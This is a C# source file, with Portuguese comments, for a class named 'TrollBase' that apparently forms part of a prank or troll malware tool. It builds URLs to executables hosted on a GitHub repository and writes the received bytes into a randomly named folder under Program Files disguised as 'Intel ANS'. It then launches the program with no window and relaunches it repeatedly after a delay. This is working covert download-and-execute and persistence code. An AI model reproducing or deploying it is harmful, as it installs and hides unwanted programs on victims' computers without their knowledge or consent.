using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace vtb.Model
{
    public class TrollBase
    {
        public int Id { get; set; }

        /// <summary>
        /// Nome do programa
        /// </summary>
        public string Nome { get; set; }

        /// <summary>
        /// Nome do processo
        /// </summary>
        public string NomeExe { get; set; }

        /// <summary>
        /// Tempo para reabrir o processo
        /// </summary>
        public int RestartDelay { get; set; }

        /// <summary>
        /// Quantidade de vezes que o processo pode ser reaberto
        /// </summary>
        private int TentativaAtual { get; set; }

        /// <summary>
        /// Quantidade de vezes que o processo pode ser reaberto
        /// </summary>
        public int Tentativas { get; set; }

        /// <summary>
        /// Caminho do processo 
        /// </summary>
        public string CaminhoLocal { get; set; }

        /// <summary>
        /// Caminho do processo 
        /// </summary>
        public string UrlExe { 
            get {
                return "https://raw.githubusercontent.com/yuridiniz/PkgInstall/master/vtb/Exe/" + NomeExe;
            }
        }

        /// <summary>
        /// Cria um caminho aleatório para o exe
        /// </summary>
        private string GerarCaminho()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            appData += "\\Intel ANS\\" + Guid.NewGuid().ToString() + "\\";
            return CaminhoLocal = appData;
        }

        /// <summary>
        /// Grava um o exe em um caminho gerado aleatoriamente
        /// </summary>
        public string GravarExe(byte[] bytes, List<Email> _emailNotificacao)
        {
            var caminho = GerarCaminho();

            string[] pathParts = caminho.Split('\\');

            for (int i = 0; i < pathParts.Length; i++)
            {
                if (i > 0)
                {
                    pathParts[i] = Path.Combine(pathParts[i - 1], pathParts[i]);

                    if (!Directory.Exists(pathParts[i].Replace(":",":\\")))
                        Directory.CreateDirectory(pathParts[i].Replace(":", ":\\"));
                }
            }

            File.WriteAllBytes(caminho + NomeExe, bytes);

            return caminho;
        }

        /// <summary>
        /// Executa o exe
        /// </summary>
        public bool ExecutarExe()
        {
            try
            {
                if (TentativaAtual >= Tentativas)
                    return false;

                using (System.Diagnostics.Process process = new System.Diagnostics.Process())
                {
                    process.StartInfo = new System.Diagnostics.ProcessStartInfo(CaminhoLocal + NomeExe);
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.ErrorDialog = false;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    process.Start();

                    while (!process.HasExited)
                        Thread.Sleep(2000);

                    Thread.Sleep(RestartDelay * 60000);

                    TentativaAtual++;

                    ExecutarExe();
                }
                return true;
            }
            catch(Exception e)
            {
                throw e;
            }
        }

        /// <summary>
        /// Verifica se exe está aberto
        /// </summary>
        public bool IsAberto()
        {
            return Process.GetProcessesByName(NomeExe.Replace(".exe","")).Length > 0;
        }
    }
}
